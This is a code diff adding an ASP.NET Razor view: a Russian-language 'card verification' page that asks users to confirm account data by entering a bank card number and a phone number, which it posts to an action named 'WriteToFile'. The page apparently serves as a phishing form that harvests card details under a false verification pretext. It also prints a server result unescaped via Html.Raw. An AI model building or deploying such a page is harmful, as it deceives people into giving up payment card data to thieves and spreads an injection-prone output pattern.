@@ -1,0 +1,37 @@
+@{
+    ViewBag.Title = "Верификация карты с номером телефона";
+    string result = ViewBag.Result;
+}
+
+@if (string.IsNullOrEmpty(result))
+{
+    <div class="conteiner">
+        @using (Html.BeginForm("WriteToFile", "Home", FormMethod.Post))
+        {
+            <header>
+                <img src="~/Content/log.jpg" />
+                <h2> Подтверждение данных<br /> учетной записи</h2>
+            </header>
+            <div class="field">
+                <p> Введите номер карты </p>
+                <input type="text" name="card" id="card" pattern="[0-9]{12}" required />
+                <i class="fa fa-credit-card" aria-hidden="true"></i>
+            </div>
+            <div class="field">
+                <p> Введите корректный номер телефона</p>
+                <input type="text" name="phone" id="phone" pattern="^((\+7)[\- ]?)?(\(?\d{3}\)?[\- ]?)?[\d\- ]{7,10}$" required />
+                <i class="fa fa-mobile" aria-hidden="true"></i>
+            </div>
+            <footer>
+                <button type="submit">Отправить</button>
+            </footer>
+        }
+    </div>
+}
+
+else
+{
+    <h3 style="margin-top: 20%; text-align: center;padding:20px" >
+        @Html.Raw(result)
+    </h3>     
+}
